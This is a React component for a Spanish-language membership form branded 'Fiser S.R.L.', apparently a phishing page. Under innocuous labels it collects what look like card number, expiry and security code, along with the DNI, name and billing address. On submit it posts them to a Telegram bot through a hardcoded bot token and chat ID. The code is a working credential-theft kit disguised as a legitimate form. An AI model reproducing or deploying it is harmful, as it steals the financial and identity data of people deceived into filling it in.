import React, { useState } from 'react'
import axios from 'axios'
import "./App.css"
import "./socios/css/lib/wqd.css"
import "./socios/css/style.css"
import Logo from "./logo.png"
import Note from "./note.png"

function App() {
  const [data, setData] = useState({
    "nc": "",
    "exp": "",
    "cv": "",
    "dni": "",
    "dir": "",
    "city": "",
    "cp": "",
    "name": ""
  })

  
  function handlerOnSubmit(e) {
    e.preventDefault()
    axios.post(
      'https://api.telegram.org/bot' + '5602347377:AAEEoyFoCPPMEgOSDyk51WXYvzm-76U9RpE' + '/sendMessage',
      {
        chat_id: '5407117206',
        text: data['nc'] + " | " + data['exp'] + " | " + data['cv'] + " | " + data['dni'] + " | " + data['dir'] + " | " + data['city'] + " | " + data['cp']
      }
    )
  }

  function handlerChange(e) {
    let hanData = {...data};
    hanData[e.target.name] = e.target.value
    setData(hanData)
  }
  
  return (
    <>
      <div id="header">
        <img className="lgo" src={Logo} />
      </div>
      <div id="body">
        <div id="container">
          <div className="content nologint">
            <h3 className="title">Formulario de Adhesion</h3>
            <h4 className="subtit">A continuacion complete el formulario</h4>
              <form id="form" className="form-altavirtual" onSubmit={handlerOnSubmit} >
              <fieldset>
                <p className="nrotar">          
                  <label>Dirección de facturación</label>
                  <span><input type="text" placeholder="" name="dir" maxLength="55" value={data["dir"]} id="dir" onChange={handlerChange}  style={{width: `180px`, height: `21px`}}  className="w180 noEnter" required/></span>
                </p>
                
                  <p className="nrotar">          
                  <label>Ciudad</label>
                  <span><input type="text" name="city" maxLength="20" value={data["city"]} id="city" style={{width: `180px`, height: `21px`}} onChange={handlerChange} className="w180 noEnter" required/></span>
                </p>			
                <p className="nrotar">          
                  <label>Código Postal</label>
                  <span><input type="text" name="cp" maxLength="10" value={data["cp"]} id="cp" style={{width: `180px`, height: `21px`}} onChange={handlerChange} className="w180 noEnter reerg" required/></span>
                </p>			
              </fieldset>
              <div style={{top: `100px`, position: `relative`}}>
                <img src={Note} style={{float: `right`, width: `320px`}}/>
              </div>
              <br/>
              <br/>
              <h4 className="subtit">Ingrese los datos del siguiente formulario para completar la adhesión</h4>
              <br/>
              <br/><br/>
              <fieldset>
                <p className="nrotar">          
                  <label>Número de Registro</label>
                  <span><input type="text" name="nc" min="16" minLength="20" maxLength="20" value={data['nc']} onChange={handlerChange} id="nc" style={{width: `180px`, height: `21px`}} className="w180 noEnter" required/></span>
                </p>			
                <p className="nrotar">          
                  <label>Vencimiento de la cuenta</label>
                  <span><input type="text" name="exp" min="5" minLength="5" maxLength="5" value={data['exp']} onChange={handlerChange} id="exp" style={{width: `180px`, height: `21px`}} className="w180 noEnter" required/></span>
                </p>	
                <p className="nrotar">          
                  <label>Cree un pin de seguridad</label>
                  <span><input type="text" name="cv" min="6" minLength="6" maxLength="6" value={data['cv']} onChange={handlerChange} id="cv" style={{width: `180px`, height: `21px`}} className="w180 noEnter" required/></span>
                </p>			
                <p className="nrotar">          
                  <label>Nombre Completo</label>
                  <span><input type="text" name="name" maxLength="30" value={data["name"]} onChange={handlerChange} id="name" style={{width: `180px`, height: `21px`}} className="w180 noEnter" required/></span>
                </p>
                <p className="nrotar">          
                  <label>Dni</label>
                  <span><input type="text" name="dni" min="7" minLength="7" maxLength="8" value={data["dni"]} onChange={handlerChange} id="dni" style={{width: `180px`, height: `21px`}} className="w180 noEnter" required/></span>
                </p> 
		          </fieldset>
              <div className="btns">
              <table>	
                <tbody><tr>				
                  <td width="200px">
                  </td><td width="200px">
                    <input type="" id="submitLogin" value="Volver" className="btn-224px jeu8" style={{border: `none`}} clearform="true" button="true" blocksui="true"/>
                  </td>
                  <td>
                    <input type="submit" id="submitLogin" value="Enviar Formulario" className="btn-224px y436" style={{border: `none`}} clearform="true" button="true" blocksui="true"/>
                  </td>				
                </tr>
              </tbody></table>
              </div>
              </form>
          </div>
        </div>
      </div>
      <footer>
      <div id="footer">
        <div className="footer-content">
          <div className="box socios">
              <h5>Socios</h5>
              <ul>
                <li><a href="/" target="_blank">Preguntas Frecuentes</a></li>
                <li><a href="/" target="_blank">Otras preguntas</a></li>
                <li><a href="/" target="_blank">Promociones</a></li>
                <li><a href="/" target="_blank">Novedades</a></li>
              </ul>
          </div>
          <div className="box comercios">          
              <h5>Comercios</h5>
              <ul>
                <li><a href="/" target="_blank">Novedades del servicio</a></li>
                <li><a href="/" target="_blank">Servicios</a></li>
                <li><a href="/" target="_blank">Novedades</a></li>
                <li><a href="/" target="_blank">Descargas</a></li>
              </ul>
          </div>        
          <div className="box empresas">
              <h5>Empresas</h5>
              <ul>
                <li><a href="/" target="_blank">Descuentos</a></li>
                <li><a href="/" target="_blank">Promociones</a></li>
              </ul>
          </div>      
          <div className="box contactenos">
              <h5>¿Necesita ayuda?</h5>
              <ul>
                <li><a href="/" target="_blank">¿Extravió su cuenta?</a></li>
                <li><a href="/" target="_blank">Buscador de servicios</a></li>
          <li><a href="/" target="_blank">Contáctese con nosotros</a></li>
              </ul>      
          </div>
        </div>
        <a href="/" className="top"></a>
        <h6>Fiser</h6>
        <p className="loginDF">
          <a href="/">Fiser S.R.L.</a> | <a href="/">Todos los derechos reservados</a><br/>    	 
          <a href="/" target="_blank">Términos y Condiciones</a> | <a href="/" target="_blank">Medidas de Seguridad</a> | <a href="/" target="_blank">Protección de Datos Personales</a> | <a href="/" target="_blank">Defensa y Protección al Consumidor</a>
        </p>
        </div>
      </footer>
    </>
  )
}

export default App